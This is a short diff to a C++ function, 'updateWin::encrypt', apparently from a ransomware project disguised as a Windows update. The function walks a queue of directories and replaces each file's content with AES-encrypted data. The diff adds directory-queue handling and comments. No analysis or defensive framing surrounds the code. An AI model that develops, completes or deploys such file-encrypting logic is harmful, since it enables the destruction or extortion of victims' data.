@@ -294,7 +294,8 @@ void updateWin::encrypt(std::vector<std::string> paths, std::vector<unsigned cha
                 fwriter << encryptedData;	// Replacing the file content with the encrypted content 
                 fwriter.close();		// Closing the file
             }
+	    Q_path.pop();	// After the scan is finished poping the directory out of the queue
         }
     }
-    delete AES;
+    delete AES; // Freeing up memory
 }
